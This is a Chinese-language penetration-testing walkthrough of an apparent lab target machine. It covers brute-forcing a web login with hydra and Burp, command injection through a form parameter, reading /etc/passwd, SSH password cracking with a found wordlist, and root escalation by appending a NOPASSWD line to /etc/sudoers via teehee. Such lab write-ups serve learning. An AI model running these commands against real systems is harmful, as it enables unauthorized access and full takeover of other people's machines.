### 信息收集

先查看靶机的MAC地址

<img src="./imgs/image-20230729182846289.png" alt="image-20230729182846289" style="zoom:33%;" />

```
arp-scan -l 
```

![image-20230729182931952](./imgs/image-20230729182931952.png)

找到目标靶机的IP地址，对其进行扫描

<img src="./imgs/image-20230729183158803.png" alt="image-20230729183158803" style="zoom:33%;" />

发现开放了80端口和ssh，浏览器访问靶机的80端口，看看有没有可以利用的东西

![image-20230729183639459](./imgs/image-20230729183639459.png)

目录爆破发现也没有什么东西

```
dirsearch -u http://192.168.80.146  
```

![image-20230729184131144](./imgs/image-20230729184131144.png)



### 漏洞利用

**利用bp进行密码爆破**

<img src="./imgs/image-20230729184554974.png" alt="image-20230729184554974" style="zoom:33%;" />

1、发送到intruder，给密码打上标记

<img src="./imgs/image-20230729184629267.png" alt="image-20230729184629267" style="zoom:33%;" />

2、倒入密码字典，然后Start attack

<img src="./imgs/image-20230729184701102.png" alt="image-20230729184701102" style="zoom:33%;" />

<img src="./imgs/image-20230729184742917.png" alt="image-20230729184742917" style="zoom:33%;" />

也可以用hydra破解密码

```shell
hydra -l admin -P top1000.txt 192.168.80.146 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F

这是一个 Hydra 的命令行指令，用于暴力破解 Web 应用程序的登录。解释如下：

hydra：命令名，表示使用 Hydra 工具。

-l admin：指定用户名为 admin。

-P top1000.txt：指定密码字典为当前目录下的 top1000.txt。

192.168.80.146：指定要攻击的服务器 IP 地址。

http-post-form：指定使用 HTTP POST 请求方式。

"/login.php:username=^USER^&password=^PASS^:S=logout"：指定登录页面地址 /login.php，并使用 username 和 password 作为参数名来传递用户名和密码。其中 ^USER^ 和 ^PASS^ 含义为在暴力破解过程之中将要用到的用户名和密码，而 :S=logout 则是指当程序返回值为 logout 时，认为破解成功并退出程序。

-F：如果成功的话，停止猜测其他密码。

综上所述，上述命令的作用就是对目标服务器 192.168.149.134 的 /login.php 页面进行暴力破解登录，用户名为 admin，密码字典为 top1000.txt
```

![image-20230729195208958](./imgs/image-20230729195208958.png)



3、账号admin,密码happy登录成功

<img src="./imgs/image-20230729184925497.png" alt="image-20230729184925497" style="zoom:33%;" />

4、点击Comand，看看有什么东西

<img src="./imgs/image-20230729185004220.png" alt="image-20230729185004220" style="zoom: 33%;" />

5、发现点了Run之后，就会运行linux命令

![image-20230729185041094](./imgs/image-20230729185041094.png)

6、可以试着再次用bp抓包

![image-20230729185235497](./imgs/image-20230729185235497.png)

7、右键发送到Repeater

![image-20230729185334558](./imgs/image-20230729185334558.png)

8、然后试着修改一下radio后面的值，发现可以执行命令

![image-20230729185503021](./imgs/image-20230729185503021.png)



9、输入`cat /etc/passwd`查看有没有用户

![image-20230729185801676](./imgs/image-20230729185801676.png)

10、继续查看每个用户的家目录，发现只有jim用户家目录有数据

<img src="./imgs/image-20230729190205452.png" alt="image-20230729190205452" style="zoom:33%;" />

![image-20230729190228704](./imgs/image-20230729190228704.png)

11、访问jim目录下backups，发现有一个旧的密码本

![image-20230729190401181](./imgs/image-20230729190401181.png)

![image-20230729190709717](./imgs/image-20230729190709717.png)





12、可是试着复制一下这个密码本里的东西，保存到一个文件里，尝试密码爆破，因为这个密码本是在jim的家目录找到的，还开了ssh远程服务，可以用hydra九头蛇破解一下

![image-20230729191414418](./imgs/image-20230729191414418.png)

13、用爆破出来的密码进行ssh连接    ，显示有已邮件

![image-20230729192015614](./imgs/image-20230729192015614.png)

14、前面对backups文件进行了查看，现在查看mbox



<img src="./imgs/image-20230729191830117.png" alt="image-20230729191830117" style="zoom:33%;" />

15、`cd /var/mail`， 查看这封邮件信息

![image-20230729192117170](./imgs/image-20230729192117170.png)

16、通过邮件内容，可以知道Charles 的密码，

可以切换到charles用户

![image-20230729192246032](./imgs/image-20230729192246032.png)

![image-20230729192548440](./imgs/image-20230729192548440.png)

### 提权提权

```shell
#查看可以运行的命令：   
sudo -l
```



![image-20230729192613380](./imgs/image-20230729192613380.png)

```shell
发现可以使用teehee，

可以使用命令：
echo 'charles ALL=(ALL:ALL) NOPASSWD:ALL' | sudo teehee -a /etc/sudoers

这句话的意思是将charles用户赋予执行sudo的权限添加到/etc/sudoers里。
| 是管道符 将前面的输出作为后面的输入
sudo teehee -a 是用管理员权限使用teehee -a命令
teehee -a 是添加一条语句到 /etc/sudoers里
/etc/sudoers 里存着的用户都有执行sudo的权限。

```

![image-20230729192722053](./imgs/image-20230729192722053.png)

![image-20230729192855299](./imgs/image-20230729192855299.png)